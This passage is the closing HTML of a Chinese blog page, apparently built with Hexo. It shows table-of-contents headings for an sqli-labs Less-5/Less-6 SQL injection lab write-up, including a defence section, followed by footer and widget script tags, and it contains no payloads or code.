class="toc-link" href="#%E4%B8%83%E3%80%81%E8%8E%B7%E5%8F%96-users-%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">8.</span> <span class="toc-text">七、获取 users 表字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E8%AF%BB%E5%8F%96-users-%E8%A1%A8%E6%95%B0%E6%8D%AE"><span class="toc-number">9.</span> <span class="toc-text">八、读取 users 表数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E4%BD%BF%E7%94%A8-limit-%E5%88%86%E6%9D%A1%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">10.</span> <span class="toc-text">九、使用 limit 分条读取数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81Less-5-%E4%B8%8E-Less-6-%E5%AF%B9%E6%AF%94"><span class="toc-number">11.</span> <span class="toc-text">十、Less-5 与 Less-6 对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">12.</span> <span class="toc-text">十一、防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">13.</span> <span class="toc-text">十二、总结</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script defer src="/js/music-player.js"></script><script defer src="/js/vendor/live2d/live2dcubismcore.min.js?v=20260509c"></script><script defer src="/js/vendor/live2d/pixi.min.js?v=20260509c"></script><script defer src="/js/vendor/live2d/pixi-live2d-display.min.js?v=20260509c"></script><script defer src="/js/live2d-anan.js?v=20260511g"></script></body></html>
